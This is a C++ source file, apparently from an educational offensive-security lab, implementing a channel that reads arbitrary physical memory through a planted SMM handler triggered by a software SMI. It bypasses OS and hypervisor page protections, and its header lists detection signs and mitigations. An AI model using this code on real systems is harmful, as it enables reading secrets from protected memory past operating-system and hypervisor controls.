// smm_channel.cpp — Educational SMM physical-memory read channel.
//
// TECHNIQUE: Plant a request in a shared buffer, raise SW-SMI, let a
// pre-installed SMM handler (lab residual) copy physical memory into
// the response region. Bypasses OS and hypervisor page permissions.
//
// SCAR: SMI count, SMI latency, unexpected EFI/SMM entries, buffer
// magic in non-SMRAM pages, lab bridge drivers.
//
// BLUE: Ranked trust (no SMM residual), SMI profiling, firmware
// attestation, TSEG lock, deny unknown SMM communicate GUIDs.
//
// MITIGATION: SMM lockdown, STM, measured boot, remove lab handlers.

#include "real/smm/smm_interface.hpp"
#include "real/platform.hpp"

#include <cstdio>
#include <cstring>
#include <vector>

namespace real::smm {

Result<std::vector<std::uint8_t>> smm_phys_read(std::uint64_t phys_addr,
                                                 std::size_t size,
                                                 std::uint64_t comm_buffer_phys,
                                                 std::size_t comm_buffer_size) {
  std::printf("[smm] smm_phys_read: pa=0x%llx size=%zu comm=0x%llx\n",
              static_cast<unsigned long long>(phys_addr), size,
              static_cast<unsigned long long>(comm_buffer_phys));

  if (size == 0) return std::vector<std::uint8_t>{};
  if (size > 0x100000) {
    return Result<std::vector<std::uint8_t>>(
        {}, "SMM phys read size capped at 1 MiB per request");
  }
  if (comm_buffer_size < sizeof(SmmCommHeader) + size) {
    return Result<std::vector<std::uint8_t>>(
        {}, "Communication buffer too small for requested read");
  }

  // Refuse to treat SMRAM itself as a casual read target without explicit size.
  auto smram = discover_smram();
  if (smram && smram->base && smram->size &&
      phys_in_range(phys_addr, smram->base, smram->size)) {
    std::printf("[smm] WARNING: target PA is inside discovered SMRAM\n");
  }

  auto request = pack_phys_read_request(phys_addr, static_cast<std::uint32_t>(size));
  // Reserve payload space in the request buffer so the handler can fill it.
  request.resize(sizeof(SmmCommHeader) + size, 0);

  auto raw = smm_communicate(comm_buffer_phys, comm_buffer_size, request);
  if (!raw) {
    return Result<std::vector<std::uint8_t>>({}, raw.error_msg);
  }

  auto payload = unpack_smm_response(*raw);
  if (!payload) {
    // Handler absent: return structured failure (not a fake zero-fill success).
    return Result<std::vector<std::uint8_t>>(
        {}, std::string("SMM phys read failed: ") + payload.error_msg.c_str());
  }
  if (payload->size() > size) payload->resize(size);
  std::printf("[smm] smm_phys_read got %zu bytes\n", payload->size());
  return payload;
}

Result<bool> smm_handler_present(std::uint64_t comm_buffer_phys,
                                  std::size_t comm_buffer_size) {
  if (comm_buffer_size < sizeof(SmmCommHeader) + 1) {
    return Result<bool>(false, "comm buffer too small");
  }
  const std::uint8_t token = 0xA5;
  auto request = pack_echo_request(token);
  auto raw = smm_communicate(comm_buffer_phys, comm_buffer_size, request);
  if (!raw) {
    // Timeout / no SMI privilege → handler not usable from this context.
    return false;
  }
  if (raw->size() < 4) return false;
  std::uint32_t magic = 0;
  std::memcpy(&magic, raw->data(), 4);
  if (magic != kSmmRspMagic) return false;
  // Prefer token echo when the handler wrote payload; magic alone is enough
  // to prove a responding lab SMM communicate path.
  if (raw->size() > sizeof(SmmCommHeader)) {
    const std::uint8_t echoed = (*raw)[sizeof(SmmCommHeader)];
    if (echoed != 0 && echoed != token) return false;
  }
  return true;
}

}  // namespace real::smm
